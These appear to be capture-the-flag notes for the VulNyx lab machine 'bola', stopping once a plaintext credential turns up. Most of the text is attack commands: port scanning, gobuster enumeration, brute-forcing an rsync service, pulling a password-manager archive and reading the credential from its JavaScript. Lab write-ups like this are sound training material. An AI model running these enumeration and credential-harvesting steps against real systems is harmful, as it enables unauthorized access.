___

```bash
export IP=192.168.0.24
./nmap.sh
```

/etc/hosts --> bola.nyx

# 80

```bash
gobuster dir -u http://bola.nyx/ -w /home/dani/Documents/lists/content.txt -t 200
```

http://bola.nyx/.well-known/openid-configuration

usernames
```
d4t4s3c
jackie0x17
ct0l4
```

# 873 Rsync

https://github.com/VulNyx/Arsenal/tree/main/rsync-brute

```bash
./rsync-brute -t bola.nyx -p 873 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

```bash
rsync -av --list-only rsync://192.168.0.24/extensions
```

```bash
rsync -avz rsync://bola.nyx/extensions/password_manager.zip .
```

```bash
cat background.js
username: "jackie0x17@nyx.com", password: "sbIJ0x9g{C3`"
```

